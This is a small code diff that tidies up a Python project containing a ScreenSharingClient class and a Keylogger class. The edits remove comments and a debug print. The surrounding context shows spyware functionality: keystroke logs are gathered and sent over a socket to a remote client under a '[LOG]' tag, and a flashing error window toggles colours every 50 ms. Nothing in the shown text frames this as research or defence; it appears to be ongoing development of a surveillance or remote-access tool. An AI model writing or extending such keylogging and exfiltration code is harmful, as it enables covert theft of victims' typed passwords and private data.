@@ -137,14 +137,12 @@ class ScreenSharingClient:
 
         def swap_colors():
             try:
-                if (
-                    not self.error_box.winfo_exists()
-                ):  # Check if the window still exists
-                    return  # Stop if the window has been destroyed
+                if not self.error_box.winfo_exists():
+                    return
                 nonlocal black, white
                 black, white = white, black
                 self.error_box.configure(bg=black)
-                self.error_box.after(50, swap_colors)  # Reschedule the function
+                self.error_box.after(50, swap_colors)
             except Exception:
                 return
 
@@ -183,7 +181,6 @@ class Keylogger:
                     client.socket.sendall(
                         f"{len(log_data)} [LOG]{log_data}".encode("utf-8")
                     )
-                    print("log sent")
                     self.log = []
 
     def start_key_logger(self):
